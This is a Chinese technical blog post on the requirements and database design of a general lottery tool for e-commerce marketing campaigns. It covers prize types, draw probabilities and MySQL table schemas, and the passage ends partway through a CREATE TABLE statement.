title="概念定义"></a>概念定义</h2><p>营销体系中我们需要把以下概念定义清楚，要使用哪些名词，以及明确其定义，防止沟通过程中的效率低下或理解偏差：</p><table><thead><tr><th>概念</th><th>定义</th></tr></thead><tbody><tr><td>抢购</td><td>爆品/新品发售场景</td></tr><tr><td>—</td><td>—</td></tr><tr><td>满减</td><td>单笔订单满多少减多少，例如，“满500减20”</td></tr><tr><td>满赠</td><td>单笔订单满多少增送其他商品，例如，“满999送秋裤”</td></tr><tr><td>买送</td><td>买就送，例如，“全场下单送秋裤”</td></tr><tr><td>限时购</td><td>限定时间区间，降价或折扣</td></tr><tr><td>秒杀</td><td>白送价格，数量极少的销售场景，例如，“一元秒杀”</td></tr><tr><td>加价购</td><td>再加多少钱，可以低价购买其他推荐商品</td></tr><tr><td>多买</td><td>单笔订单购买多个sku，享受折扣</td></tr><tr><td>全款预售</td><td>预售库存一次付清</td></tr><tr><td>订金膨胀预售</td><td>包含订金阶段、尾款阶段，订金翻倍抵现尾款，订金可退</td></tr><tr><td>定金膨胀预售</td><td>包含定金阶段、尾款阶段，定金翻倍抵现尾款，定金不退</td></tr><tr><td>盲售</td><td>包含订金(定金)阶段，尾款阶段；不知道尾款价格，不知道sku的具体信息，只知道spu的信息（可选）</td></tr><tr><td>拼团</td><td>限定时间凑够多人成功支付订单(享优惠价格)</td></tr><tr><td>砍价(点赞降价)</td><td>限定时间邀请好友砍价到指定金额</td></tr><tr><td>众筹</td><td>限定时间购买人数达到指定人数及以上即可成功享受优惠价格</td></tr><tr><td>组合套装</td><td>多个sku捆绑销售</td></tr><tr><td>—</td><td>—</td></tr><tr><td>满减券</td><td>单笔订单满多少才能使用的优惠券</td></tr><tr><td>折扣券</td><td>单笔订单折扣</td></tr><tr><td>现金券</td><td>单笔订单抵现金</td></tr></tbody></table><h1 id="通用抽奖工具-万能胶Glue"><a href="#通用抽奖工具-万能胶Glue" class="headerlink" title="通用抽奖工具(万能胶Glue)"></a>通用抽奖工具(万能胶Glue)</h1><h2 id="抽奖需求分析"><a href="#抽奖需求分析" class="headerlink" title="抽奖需求分析"></a>抽奖需求分析</h2><p>首先我们先来回顾下<strong>营销体系</strong>的组成：</p><table><thead><tr><th>营销体系</th></tr></thead><tbody><tr><td>活动营销系统</td></tr><tr><td>销售营销系统</td></tr></tbody></table><p>今天带来的是<strong>活动营销系统</strong>下的第一个独立子系统<strong>通用抽奖工具</strong>的介绍，本篇文章主要分为如下4部分：</p><ul><li>常见抽奖场景与归类</li><li>抽奖需求配置</li><li>常见奖品类型</li><li>抽奖五要素</li></ul><h2 id="常见抽奖场景与归类"><a href="#常见抽奖场景与归类" class="headerlink" title="常见抽奖场景与归类"></a>常见抽奖场景与归类</h2><p>下面是我列出来的一些常见的抽奖场景，红包雨、糖果雨、打地鼠、大转盘(九宫格)、考眼力、答题闯关、游戏闯关、支付刮刮乐、积分刮刮乐等等活动营销场景。</p><table><thead><tr><th>活动名称</th><th>描述</th></tr></thead><tbody><tr><td>红包雨</td><td>每日整点抢红包🧧抽奖，每个整点一般可参与一次</td></tr><tr><td>糖果雨</td><td>每日整点抢糖果🍬抽奖，每个整点一般可参与一次</td></tr><tr><td>打地鼠</td><td>每日整点打地鼠抽奖，每个整点一般可参与一次</td></tr><tr><td>大转盘(九宫格)</td><td>某个时间段，转盘抽奖，每个场一般可参N次</td></tr><tr><td>考眼力</td><td>某个时间段，旋转杯子猜小球在哪个被子里，猜对可抽奖，一般每日可参与N次</td></tr><tr><td>答题闯关</td><td>每过一关，可参与抽奖，越到后面奖品越贵重</td></tr><tr><td>游戏闯关</td><td>每过一关，可参与抽奖，越到后面奖品越贵重</td></tr><tr><td>支付刮刮乐</td><td>支付订单后可刮奖，支付金额越大奖品越贵重</td></tr><tr><td>积分刮刮乐</td><td>积分刮奖，消费积分额度越大奖品越贵重</td></tr></tbody></table><p>通过上面的活动描述，我们把整个抽奖场景归为以下三类：</p><table><thead><tr><th>类型</th><th>活动名称</th><th>维度</th></tr></thead><tbody><tr><td>按时间抽奖</td><td>红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力</td><td>时间维度</td></tr><tr><td>按抽奖次数抽奖</td><td>答题闯关、游戏闯关</td><td>参与该活动次数维度</td></tr><tr><td>按数额范围区间抽奖</td><td>支付刮刮乐、积分刮刮乐</td><td>数额区间维度</td></tr></tbody></table><p>接着我们来看下每类抽奖活动具体的抽奖需求配置。</p><h2 id="抽奖需求配置"><a href="#抽奖需求配置" class="headerlink" title="抽奖需求配置"></a>抽奖需求配置</h2><p>本小节每类抽奖活动的需求配置，分为如下三个部分：</p><ul><li>活动配置</li><li>场次配置</li><li>奖品配置</li></ul><h3 id="首先，第一类-按时间抽奖的需求配置"><a href="#首先，第一类-按时间抽奖的需求配置" class="headerlink" title="首先，第一类: 按时间抽奖的需求配置"></a>首先，第一类: <code>按时间抽奖</code>的需求配置</h3><table><thead><tr><th>类型</th><th>活动名称</th><th>特点</th></tr></thead><tbody><tr><td>按时间抽奖</td><td>红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力</td><td>时间维度</td></tr></tbody></table><table><thead><tr><th>按时间抽奖</th><th>是否多场次</th><th>单场次次数限制(次)</th><th>总场次次数限制(次)</th></tr></thead><tbody><tr><td>红包雨</td><td>是</td><td>1</td><td>N</td></tr><tr><td>糖果雨</td><td>是</td><td>1</td><td>N</td></tr><tr><td>打地鼠</td><td>是</td><td>N</td><td>N</td></tr><tr><td>幸运大转盘(九宫格)</td><td>否</td><td>N</td><td>N</td></tr><tr><td>考眼力</td><td>否</td><td>N</td><td>N</td></tr></tbody></table><p>通过上面的分析我们得到了<strong>活动</strong>和<strong>场次</strong>的概念: 一个活动需要支持多场次的配置。</p><ul><li>活动activity:配置活动的日期范围</li><li>场次session:配置每场的具体时间范围</li></ul><p><strong>红包雨的需求配置示例：</strong></p><blockquote><p>活动特征：红包雨需要支持多场次。</p></blockquote><p>比如双十二期间三天、每天三场整点红包雨配置如下：</p><p>活动、场次配置：</p><table><thead><tr><th>双十二红包雨</th></tr></thead><tbody><tr><td>活动配置：</td></tr><tr><td>2019-12-10 至 2019-12-12</td></tr><tr><td>场次配置：</td></tr><tr><td>10:00:00 至 10:01:00</td></tr><tr><td>12:00:00 至 12:01:00</td></tr><tr><td>18:00:00 至 18:01:00</td></tr></tbody></table><p>奖品配置：</p><table><thead><tr><th>场次</th><th>奖品1</th><th>奖品2</th><th>—</th><th>奖品N</th></tr></thead><tbody><tr><td>场次10:00:00 至 10:01:00</td><td>优惠券2元</td><td>空奖</td><td>—</td><td>无</td></tr><tr><td>场次12:00:00 至 12:01:00</td><td>优惠券5元</td><td>空奖</td><td>—</td><td>无</td></tr><tr><td>场次18:00:00 至 18:01:00</td><td>优惠券10元</td><td>优惠券20元</td><td>—</td><td>空奖</td></tr></tbody></table><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">上面配置的结果如下：</span><br><span class="line"></span><br><span class="line">2019-12-10日三场整点红包雨：</span><br><span class="line">2019-12-10 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-10 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-10 18:00:00 ~ 18:01:00</span><br><span class="line"></span><br><span class="line">2019-12-11日三场整点红包雨：</span><br><span class="line">2019-12-11 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-11 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-11 18:00:00 ~ 18:01:00</span><br><span class="line"></span><br><span class="line">2019-12-12日三场整点红包雨：</span><br><span class="line">2019-12-12 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-12 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-12 18:00:00 ~ 18:01:00</span><br></pre></td></tr></table></figure><p><strong>幸运大转盘的需求配置示例：</strong></p><blockquote><p>活动特征：幸运大转盘不需要多场次。</p></blockquote><p>比如年货节2020-01-20 至 2020-02-10期间幸运大转盘配置如下：</p><p>活动、场次配置：</p><table><thead><tr><th>双十二幸运大转盘</th></tr></thead><tbody><tr><td>活动配置：</td></tr><tr><td>2019-12-10 至 2019-12-12</td></tr><tr><td>场次配置：</td></tr><tr><td>00:00:00 至 23:59:59</td></tr></tbody></table><p>奖品配置：</p><table><thead><tr><th>场次</th><th>奖品1</th><th>奖品2</th><th>—</th><th>奖品N</th></tr></thead><tbody><tr><td>场次00:00:00 至 23:59:59</td><td>优惠券2元</td><td>空奖</td><td>—</td><td>无</td></tr></tbody></table><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上面配置的结果如下：</span><br><span class="line"></span><br><span class="line">幸运大转盘抽奖活动将于 2019-12-10 00:00:00 ~ 2019-12-12 23:59:59 进行</span><br></pre></td></tr></table></figure><p>注意与思考：双十二幸运大转盘不需要多个场次，只配置一个场次即可，完全复用活动场次模型。</p><h3 id="接着，第二类-按抽奖次数抽奖的需求配置"><a href="#接着，第二类-按抽奖次数抽奖的需求配置" class="headerlink" title="接着，第二类: 按抽奖次数抽奖的需求配置"></a>接着，第二类: <code>按抽奖次数抽奖</code>的需求配置</h3><table><thead><tr><th>类型</th><th>活动名称</th><th>特点</th></tr></thead><tbody><tr><td>按抽奖次数抽奖</td><td>答题闯关、游戏闯关</td><td>(成功参与)当前活动次数维度</td></tr></tbody></table><p><strong>答题闯关的需求配置示例：</strong></p><blockquote><p>活动特征：每一关的奖品不同，一般越到后面中大奖的几率越大。</p></blockquote><p>活动、场次配置：</p><table><thead><tr><th>双十二答题闯关</th></tr></thead><tbody><tr><td>活动配置：</td></tr><tr><td>2019-12-10 至 2019-12-12</td></tr><tr><td>场次配置：</td></tr><tr><td>00:00:00 至 23:59:59</td></tr></tbody></table><p>奖品配置：</p><table><thead><tr><th>双十二答题闯关</th><th>奖品</th></tr></thead><tbody><tr><td>第一关</td><td>优惠券2元</td></tr><tr><td>第二关</td><td>优惠券5元</td></tr><tr><td>第三关</td><td>优惠券10元</td></tr><tr><td>第四关</td><td>优惠券20元</td></tr><tr><td>第五关</td><td>优惠券50元</td></tr><tr><td>第六关</td><td>优惠券100元</td></tr></tbody></table><p>注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。</p><h3 id="最后，第三类-按数额范围区间抽奖的需求配置："><a href="#最后，第三类-按数额范围区间抽奖的需求配置：" class="headerlink" title="最后，第三类: 按数额范围区间抽奖的需求配置："></a>最后，第三类: <code>按数额范围区间抽奖</code>的需求配置：</h3><table><thead><tr><th>类型</th><th>活动名称</th><th>特点</th></tr></thead><tbody><tr><td>按数额范围区间抽奖</td><td>支付刮刮乐、积分刮刮乐</td><td>数额区间维度</td></tr></tbody></table><p><strong>支付刮刮乐的需求配置示例：</strong></p><blockquote><p>活动特征：不同的订单金额，一般金额越大中大奖的几率越大。</p></blockquote><p>活动、场次配置:</p><table><thead><tr><th>双十二答题闯关</th></tr></thead><tbody><tr><td>活动配置：</td></tr><tr><td>2019-12-10 至 2019-12-12</td></tr><tr><td>场次配置：</td></tr><tr><td>00:00:00 至 23:59:59</td></tr></tbody></table><p>奖品配置：</p><table><thead><tr><th>订单金额</th><th>奖品1</th><th>奖品2</th><th>—</th><th>奖品N</th></tr></thead><tbody><tr><td>0~100</td><td>优惠券2元</td><td>空奖</td><td>—</td><td>无</td></tr><tr><td>100~200</td><td>优惠券5元</td><td>空奖</td><td>—</td><td>无</td></tr><tr><td>200~1000</td><td>优惠券10元</td><td>优惠券20元</td><td>—</td><td>空奖</td></tr><tr><td>1000以上</td><td>优惠券50元</td><td>笔记本电脑</td><td>—</td><td>空奖</td></tr></tbody></table><p>注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。</p><blockquote><p>总结: 通过上面的分析我们得到了抽奖工具的两个要素<strong>活动</strong>和<strong>场次</strong>。</p></blockquote><h2 id="常见奖品类型"><a href="#常见奖品类型" class="headerlink" title="常见奖品类型"></a>常见奖品类型</h2><blockquote><p>抽奖抽什么？</p></blockquote><table><thead><tr><th>常见奖品类型</th></tr></thead><tbody><tr><td>优惠券</td></tr><tr><td>积分</td></tr><tr><td>实物</td></tr><tr><td>空奖</td></tr></tbody></table><blockquote><p>总结: 我们得到了抽奖工具的另一个要素<strong>奖品</strong>。</p></blockquote><h2 id="抽奖五要素"><a href="#抽奖五要素" class="headerlink" title="抽奖五要素"></a>抽奖五要素</h2><p>通过上面的分析我们已经得到了抽奖的<strong>三要素</strong></p><ul><li>活动 </li><li>场次 </li><li>奖品</li></ul><blockquote><p>那还有什么要素我们还没聊到呢？接下来来看。</p></blockquote><p><strong>第四要素：中奖概率</strong></p><p>抽奖自然离不开奖品的中奖概率的设置。关于中奖概率我们支持如下灵活的配置：</p><ol><li>手动设置奖品中奖概率</li><li>自动概率，根据当前奖品的数量、奖品的权重得到中奖概率</li></ol><p>比如我们某次大促活动红包雨的配置如下：</p><table><thead><tr><th>活动配置</th><th>描述</th></tr></thead><tbody><tr><td>活动时间</td><td>2019-12-10至2019-12-12</td></tr><tr><td>活动名称</td><td>2019双十二大促整点红包雨</td></tr><tr><td>活动描述</td><td>2019双十二大促全端整点红包雨活动</td></tr><tr><td>手动设置奖品概率</td><td>是</td></tr></tbody></table><table><thead><tr><th>场次</th><th>奖品类型</th><th>具体奖品</th><th>奖品数量</th><th>中奖概率</th></tr></thead><tbody><tr><td>10:00:00 ~ 10:01:00</td><td>优惠券</td><td>2元优惠券</td><td>2000</td><td>50%</td></tr><tr><td>-</td><td>优惠券</td><td>5元优惠券</td><td>1000</td><td>20%</td></tr><tr><td>-</td><td>空奖</td><td>-</td><td>5000</td><td>30%</td></tr><tr><td>12:00:00 ~ 12:01:00</td><td>优惠券</td><td>2元优惠券</td><td>2000</td><td>50%</td></tr><tr><td>-</td><td>优惠券</td><td>5元优惠券</td><td>1000</td><td>20%</td></tr><tr><td>-</td><td>空奖</td><td>-</td><td>5000</td><td>30%</td></tr><tr><td>18:00:00 ~ 18:01:00</td><td>优惠券</td><td>2元优惠券</td><td>2000</td><td>50%</td></tr><tr><td>-</td><td>优惠券</td><td>5元优惠券</td><td>1000</td><td>20%</td></tr><tr><td>-</td><td>空奖</td><td>-</td><td>5000</td><td>30%</td></tr></tbody></table><p>备注：每轮场次中奖概率之和必须为100%，否则剩余部分默认添加为空奖的中奖概率。</p><p><strong>第五要素：均匀投奖</strong></p><blockquote><p>如何均匀的抽走奖品?</p></blockquote><p>答案: 均匀投奖。</p><p>具体方式为拆分总奖品数量，到各个细致具体的时间段。以双十二幸运大转盘为例：</p><table><thead><tr><th>场次</th><th>奖品类型</th><th>具体奖品</th><th>奖品数量</th><th>中奖概率</th><th>投奖时间(默认提前5分钟投奖)</th><th>投奖数量</th></tr></thead><tbody><tr><td>00:00:00 至 23:59:59</td><td>优惠券</td><td>2元优惠券</td><td>2000</td><td>50%</td><td>-</td><td>-</td></tr><tr><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>00:00:00</td><td>2000</td></tr><tr><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>06:00:00</td><td>2000</td></tr><tr><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>12:00:00</td><td>2000</td></tr><tr><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>18:00:00</td><td>2000</td></tr></tbody></table><p>这里我们就得到了抽奖的<strong>第五个要素：均匀投奖</strong>。</p><h2 id="需求总结"><a href="#需求总结" class="headerlink" title="需求总结"></a>需求总结</h2><p>通过上面的分析，我们得到抽奖五要素如下：</p><table><thead><tr><th>抽奖五要素</th><th>要素名称</th></tr></thead><tbody><tr><td>第一要素</td><td>活动</td></tr><tr><td>第二要素</td><td>场次</td></tr><tr><td>第三要素</td><td>奖品</td></tr><tr><td>第四要素</td><td>中奖概率</td></tr><tr><td>第五要素</td><td>均匀投奖</td></tr></tbody></table><p>同时我们通过<strong>抽奖五要素</strong>也得到了<strong>通用抽奖工具</strong>配置一场抽奖活动的5个基本步骤：</p><ol><li>活动配置</li><li>场次配置</li><li>奖品配置</li><li>奖品中奖概率配置</li><li>奖品投奖配置</li></ol><h2 id="通用抽奖工具系统设计"><a href="#通用抽奖工具系统设计" class="headerlink" title="通用抽奖工具系统设计"></a>通用抽奖工具系统设计</h2><p>需求已经分析完了，今天我们就来看看这通用抽奖工具具体的设计，分为如下三个部分：</p><ul><li>DB设计</li><li>配置后台设计</li><li>接口设计</li></ul><h2 id="DB设计"><a href="#DB设计" class="headerlink" title="DB设计"></a>DB设计</h2><p>第一要素<code>活动配置</code>的<code>抽奖活动表</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_activity 抽奖活动表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_activity`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`serial_no`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动编号(md5值中间16位)'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动名称'</span>,</span><br><span class="line">    <span class="string">`description`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动描述'</span>,</span><br><span class="line">    <span class="string">`activity_type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">COMMENT</span> <span class="string">'活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖'</span>,</span><br><span class="line">    <span class="string">`probability_type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">COMMENT</span> <span class="string">'中奖概率类型1: static 2: dynamic'</span>,</span><br><span class="line">    <span class="string">`times_limit`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖次数限制，0默认不限制'</span>,</span><br><span class="line">    <span class="string">`start_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动开始时间'</span>,</span><br><span class="line">    <span class="string">`end_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动结束时间'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖活动表'</span>;</span><br></pre></td></tr></table></figure><p>第二要素<code>场次配置</code>的<code>抽奖场次表</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session 抽奖场次表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`activity_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`times_limit`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖次数限制，0默认不限制'</span>,</span><br><span class="line">    <span class="string">`start_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次开始时间'</span>,</span><br><span class="line">    <span class="string">`end_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次结束时间'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次表'</span>;</span><br></pre></td></tr></table></figure><p>第三、四要素<code>奖品配置</code>的<code>抽奖场次奖品表</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session_prizes 抽奖场次奖品表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session_prizes`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`session_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`node`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'节点标识 按时间抽奖: 空值, 按抽奖次数抽奖: 第几次参与值, 按数额范围区间抽奖: 数额区间上限值'</span>,</span><br><span class="line">    <span class="string">`prize_type`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品类型 1:优惠券, 2:积分, 3:实物, 4:空奖 ...'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品名称'</span>,</span><br><span class="line">    <span class="string">`pic_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品图片'</span>,</span><br><span class="line">    <span class="string">`value`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'奖品抽象值 优惠券:优惠券ID, 积分:积分值, 实物: sku ID'</span>,</span><br><span class="line">    <span class="string">`probability`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span 